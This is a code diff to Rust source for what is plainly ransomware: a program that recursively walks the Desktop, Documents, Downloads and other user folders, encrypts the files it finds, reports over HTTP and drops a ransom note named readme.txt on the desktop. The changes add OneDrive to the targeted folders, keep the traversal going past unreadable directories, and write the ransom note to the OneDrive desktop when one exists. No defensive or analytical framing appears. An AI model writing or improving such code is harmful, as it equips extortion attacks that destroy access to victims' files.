@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 use reqwest::blocking::Client;
 use std::{collections, fs, io::Write, path};
@@ -8,7 +8,8 @@ mod crypto;
 mod filesystem;
 
 fn encrypt_local_filesystem(customer: &crypto::Customer) {
-    let folders = [
+    let folders = vec![
+        "OneDrive",
         "Desktop",
         "Documents",
         "Downloads",
@@ -29,17 +30,18 @@ fn encrypt_local_filesystem(customer: &crypto::Customer) {
 }
 
 fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
-    let contents = fs::read_dir(path).unwrap();
-    for entry in contents {
-        let entry = entry.unwrap();
-        match filesystem::check_dir_entry(&entry.path()) {
-            0 => {
-                walk_dir(&entry.path(), customer);
+    if let Ok(contents) = fs::read_dir(path) {
+        for entry in contents {
+            let entry = entry.unwrap();
+            match filesystem::check_dir_entry(&entry.path()) {
+                0 => {
+                    walk_dir(&entry.path(), customer);
+                }
+                1 => {
+                    crypto::encrypt(&entry.path(), customer);
+                }
+                _ => (),
             }
-            1 => {
-                crypto::encrypt(&entry.path(), customer);
-            }
-            _ => (),
         }
     }
 }
@@ -56,9 +58,15 @@ pub fn report(message: &str) {
 }
 
 fn create_ransom_note() {
-    let mut file =
-        fs::File::create(dirs::home_dir().unwrap().join("Desktop").join("readme.txt")).unwrap();
-    file.write_all(constants::RANSOM_NOTE.as_bytes()).unwrap();
+    let desktop = dirs::home_dir().unwrap().join("Desktop");
+    let onedrive_desktop = dirs::home_dir().unwrap().join("OneDrive").join("Desktop");
+    if onedrive_desktop.exists() {
+        let mut file = fs::File::create(onedrive_desktop.join("readme.txt")).unwrap();
+        file.write_all(constants::RANSOM_NOTE.as_bytes()).unwrap();
+    } else {
+        let mut file = fs::File::create(desktop.join("readme.txt")).unwrap();
+        file.write_all(constants::RANSOM_NOTE.as_bytes()).unwrap();
+    }
 }
 
 fn main() {
